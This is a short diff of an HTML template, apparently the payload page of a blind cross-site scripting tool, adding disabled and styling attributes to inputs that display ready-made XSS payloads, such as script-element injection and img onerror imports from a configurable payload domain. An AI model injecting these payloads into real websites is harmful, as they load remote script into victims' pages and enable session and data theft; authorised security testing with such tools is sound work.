@@ -38,13 +38,13 @@
                   <input value='$.getScript("//{{setting[payload-domain]}}")' disabled class="form-control"><br>
 
                   <label class="control-label">Create Element</label>
-                  <input value="javascript:eval('var a=document.createElement(\'script\');a.src=\'//{{setting[payload-domain]}}\';document.body.appendChild(a)')" disabled class="form-control">
-                  
+                  <input value="javascript:eval('var a=document.createElement(\'script\');a.src=\'//{{setting[payload-domain]}}\';document.body.appendChild(a)')" disabled class="form-control"><br>
+
                   <label class="control-label">Img import</label>
-                  <input value="'><img src onerror=import('//{{setting[payload-domain]}}/i')>">
-                  
+                  <input value="'><img src onerror=import('//{{setting[payload-domain]}}/i')>" disabled class="form-control"><br>
+
                   <label class="control-label">Img import with screenshot</label>
-                  <input value="'><img src onerror=import('//{{setting[payload-domain]}}/s')>">
+                  <input value="'><img src onerror=import('//{{setting[payload-domain]}}/s')>" disabled class="form-control">
                 </div>
               </div>
             </div>
